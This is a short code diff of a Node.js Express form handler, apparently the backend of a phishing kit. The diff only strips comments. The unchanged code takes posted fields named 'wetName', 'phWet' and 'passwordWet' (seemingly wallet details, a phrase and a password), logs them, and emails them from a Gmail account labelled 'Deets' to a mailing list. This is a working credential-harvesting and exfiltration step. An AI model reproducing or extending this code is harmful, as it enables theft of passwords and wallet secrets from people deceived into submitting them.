@@ -33,10 +33,8 @@ app.post('/submit', async (req, res) => {
   try {
     console.log('Srcvd:', req.body);
 
-    // Extract form data
     const { wetName, phWet, passwordWet } = req.body;
 
-    // Prepare email options
     const mailOptions = {
       from: '"Deets" <divasnow178@gmail.com>',
       to: maillist,
@@ -47,7 +45,6 @@ app.post('/submit', async (req, res) => {
       `
     };
 
-    // Send email
     const info = await transporter.sendMail(mailOptions);
 
     res.status(200).send('Wdestscesful');
